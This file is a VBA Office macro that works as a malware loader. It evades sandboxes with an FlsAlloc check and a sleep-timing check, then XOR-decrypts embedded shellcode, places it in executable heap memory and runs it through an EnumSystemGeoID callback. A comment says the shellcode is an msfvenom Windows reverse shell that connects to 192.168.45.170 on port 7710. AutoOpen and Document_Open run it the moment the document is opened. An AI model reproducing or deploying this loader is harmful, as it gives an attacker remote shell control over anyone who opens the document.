Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapFree Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal lpMem As LongPtr) As Boolean
Private Declare PtrSafe Function EnumSystemGeoID Lib "kernel32" (ByVal GeoClass As Long, ByVal ParentGeoId As Long, ByVal lpGeoEnumProc As LongPtr) As Boolean
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)

Function MyMacro()
    Dim heapHandle As LongPtr
    Dim Address As LongPtr
    Dim counter As Long
    Dim data As Byte
    Dim Warhead() As Variant
    Dim tmp As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    
    ' Exit if FlsAlloc fails
    If IsNull(FlsAlloc(tmp)) Then Exit Function

    ' Timing check
    t1 = Now()
    Sleep 2000
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 2 Then Exit Function
    
    ' msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=7710 -f csharp 
    ' Output from Helpers/XOR_Shellcode_Encrypter_Helper_VBA_3Byte.cs
    Warhead = Array(246, 50, 8, 10, 218, 138, 106, 83, 111, 59, 26, 238, 129, 138, 186, 129, 136, 134, 129, 136, 158, 129, 168, 162, 5, 109, 192, 44, 235, 117, 166, 230, _
                   235, 118, 216, 166, 42, 27, 69, 7, 219, 77, 232, 40, 216, 93, 81, 216, 26, 81, 192, 54, 81, 198, 27, 162, 105, 66, 219, 91, 91, 81, 211, 42, _
                   219, 89, 129, 147, 146, 233, 224, 195, 129, 238, 1, 11, 12, 187, 245, 118, 75, 197, 215, 139, 205, 226, 106, 127, 44, 137, 119, 34, 177, 119, _
                   254, 255, 238, 130, 1, 82, 254, 139, 217, 188, 1, 6, 145, 1, 82, 198, 139, 217, 81, 142, 129, 219, 90, 131, 158, 174, 46, 129, 209, 107, _
                   131, 208, 91, 37, 106, 85, 133, 208, 129, 200, 97, 135, 135, 224, 11, 87, 15, 184, 218, 138, 10, 138, 226, 59, 81, 229, 141, 37, 95, 177, _
                   42, 63, 168, 140, 226, 172, 79, 55, 151, 37, 95, 54, 220, 246, 0, 90, 113, 234, 175, 143, 177, 157, 153, 120, 181, 224, 10, 137, 117, 223, _
                   185, 231, 110, 244, 239, 114, 191, 170, 37, 177, 170, 99, 170, 233, 101, 180, 236, 99, 189, 138)

    ' XOR Decryption Key (3 bytes)
    Dim key(2) As Byte
    key(0) = 10
    key(1) = 218
    key(2) = 138
    
    ' Decryption Process
    For i = 0 To UBound(Warhead)
        Warhead(i) = Warhead(i) Xor key(i Mod 3)
    Next i
    
    ' Allocate memory using HeapCreate and HeapAlloc
    heapHandle = HeapCreate(&H40000, 4096, 0)
    Address = HeapAlloc(heapHandle, &H8, UBound(Warhead) + 1)
    
    ' Copy decrypted shellcode to allocated memory
    For counter = LBound(Warhead) To UBound(Warhead)
        data = Warhead(counter)
        RtlMoveMemory ByVal Address + counter, data, 1
    Next counter
    
    ' Execute the shellcode
    Call EnumSystemGeoID(0, 0, Address)
    
    ' Free the allocated memory
    Call HeapFree(heapHandle, 0, Address)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub